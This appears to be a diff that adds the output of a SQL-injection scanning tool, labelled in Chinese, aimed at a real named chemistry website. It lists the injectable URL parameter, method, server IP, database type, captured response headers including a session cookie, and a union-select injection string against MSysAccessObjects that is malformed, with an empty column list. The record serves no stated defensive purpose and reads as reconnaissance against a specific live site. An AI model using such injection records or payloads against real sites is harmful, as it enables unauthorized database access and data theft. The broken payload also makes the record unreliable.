@@ -1,0 +1,24 @@
+■漏洞信息:============================================================
+ ·URL:http://www.3dchem.com/molecules.asp?ID=90
+ ·页面标题：DDT, What isDDT? About its Science, Chemistry and Structure
+ ·参数:ID=90
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:205.178.152.40
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Cache-Control: private
+Connection: close
+Date: Sat, 10 Sep 2011 12:51:09 GMT
+Content-Length: 7821
+Content-Type: text/html
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Set-Cookie: ASPSESSIONIDQAABRRDC=ECFEBEJBBABFJABHOAIANGKJ; path=/
+
+
+联合查询列数: 总共= 0  显示的列= 1
+联合查询SQL: and 3=8 union select  from MSysAccessObjects
